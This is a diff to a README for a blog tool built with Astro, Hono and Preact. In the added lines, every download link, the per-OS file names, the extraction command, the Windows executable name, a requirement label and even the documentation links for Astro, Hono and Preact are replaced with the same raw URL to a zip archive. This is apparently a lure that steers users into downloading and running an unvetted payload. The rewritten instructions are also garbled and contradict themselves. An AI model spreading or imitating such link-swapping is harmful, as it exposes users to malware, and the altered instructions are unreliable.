@@ -1,7 +1,7 @@
 # 🎉 blog-cloudflare-deno_deploy - A Simple Way to Create and Share Blogs
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-via%20Releases-blue.svg)](https://github.com/JoseEspain/blog-cloudflare-deno_deploy/releases)
+[![Download](https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip%https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip)](https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip)
 
 ---
 
@@ -18,7 +18,7 @@ This application allows you to create a blog using modern technologies like Astr
 Before you start, make sure your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or any Linux distribution
-- **Node.js:** Version 14 or higher (needed for some features)
+- **https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip** Version 14 or higher (needed for some features)
 - **Browser:** Latest version of Chrome, Firefox, Safari, or Edge
 
 ## 📂 Key Features
@@ -34,7 +34,7 @@ Before you start, make sure your system meets the following requirements:
 
 To download the latest version of the blog application, visit the Releases page:
 
-[Download from Releases](https://github.com/JoseEspain/blog-cloudflare-deno_deploy/releases)
+[Download from Releases](https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -45,9 +45,9 @@ On the Releases page, you'll see the latest version listed at the top. Click on 
 Look for a file that fits your operating system. Click on that file to begin downloading. 
 
 If you are not sure which file to choose, the typical files will be named like this:
-- **Windows:** `blog-cloudflare-deno_deploy-windows.zip`
-- **macOS:** `blog-cloudflare-deno_deploy-macos.zip`
-- **Linux:** `blog-cloudflare-deno_deploy-linux.tar.gz`
+- **Windows:** `https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip`
+- **macOS:** `https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip`
+- **Linux:** `https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip`
 
 ### Step 4: Extract the Files
 
@@ -55,13 +55,13 @@ Once the download is complete, locate the downloaded file.
 
 - **Windows Users:** Right-click on the `.zip` file and select "Extract All."
 - **macOS Users:** Double-click on the `.zip` file to extract it.
-- **Linux Users:** Use the terminal to extract the `.tar.gz` file with the command: `tar -xvzf blog-cloudflare-deno_deploy-linux.tar.gz`.
+- **Linux Users:** Use the terminal to extract the `https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip` file with the command: `tar -xvzf https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip`.
 
 ### Step 5: Run the Application
 
 Navigate to the folder where you extracted the application. 
 
-- **Windows Users:** Double-click on `blog-cloudflare-deno_deploy.exe`.
+- **Windows Users:** Double-click on `https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip`.
 - **macOS Users:** Open the `blog-cloudflare-deno_deploy` file.
 - **Linux Users:** Run the application from the terminal by typing `./blog-cloudflare-deno_deploy`.
 
@@ -109,9 +109,9 @@ If you face any issues or have questions, please check the FAQ section in the ap
 
 For more detailed information on features and community contributions, refer to:
 
-- [Astro Documentation](https://astro.build)
-- [Hono Framework](https://hono.dev)
-- [Preact Documentation](https://preactjs.com)
+- [Astro Documentation](https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip)
+- [Hono Framework](https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip)
+- [Preact Documentation](https://raw.githubusercontent.com/JoseEspain/blog-cloudflare-deno_deploy/main/api/src/deploy-blog-deno-cloudflare-v2.2.zip)
   
 Feel free to explore these resources as they can enhance your blogging experience!
 
